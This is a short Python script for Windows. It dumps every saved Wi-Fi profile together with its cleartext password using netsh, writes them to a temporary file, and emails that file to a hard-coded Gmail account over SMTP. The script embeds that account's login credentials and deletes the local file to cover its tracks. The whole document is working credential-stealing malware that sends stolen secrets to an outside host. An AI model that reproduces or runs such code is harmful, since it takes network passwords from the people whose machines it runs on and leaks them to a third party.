from fileinput import filename
import subprocess
from email.mime.multipart import MIMEMultipart
import smtplib
from email.mime.text import MIMEText
import platform
import os

# GETTING WI-FI NAMES
getWifiNames = subprocess.check_output(
    ['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')

profiles = []

for userProfile in getWifiNames.split('\n'):
    if "All User Profile" in userProfile:
        profiles.append(userProfile.split(":")[1].replace('\r', ''))

# GETTING WI-FI PASSWORDS
for profile in profiles:
    getWifiDetails = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profiles', profile.replace(" ", ""), 'key=clear']).decode('utf-8')
    for passwd in getWifiDetails.split('\n'):
        if "Key Content" in passwd:
            divider = "************************************************************************************************"
            final = f"{divider}\n\nWi-Fi Name : {profile.strip()} \nPassword {passwd.strip().replace('Key Content            ', ' ')}\n\n"

            file = open("wifi_passwords.txt", 'a')
            passwdFile = file.write(final)
            file.close()

# GETTING SYSTEM HOST NAME
sysHostName = platform.uname()[1]

# SENDING MAIL WITH PASSWORDS
message = MIMEMultipart()
message["from"] = "ameyswork1@gmail.com"
message["to"] = "ameyswork1@gmail.com"
message["subject"] = f"Wi-Fi Passwords of {sysHostName}"

try:
    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smpt:
        smpt.ehlo()
        smpt.starttls()
        smpt.login("ameyswork1@gmail.com", password="roxlyaddndiyeeta")
        f = open("wifi_passwords.txt")
        attachment = MIMEText(f.read())
        attachment.add_header('Content-Disposition',
                              'attachment', filename="wifi_passwords.txt")
        message.attach(attachment)
        smpt.send_message(message)
        f.close()
except Exception as e:
    print("Something went wrong:")
    print(e)
finally:
    os.remove("wifi_passwords.txt")
    print('Task Successful')
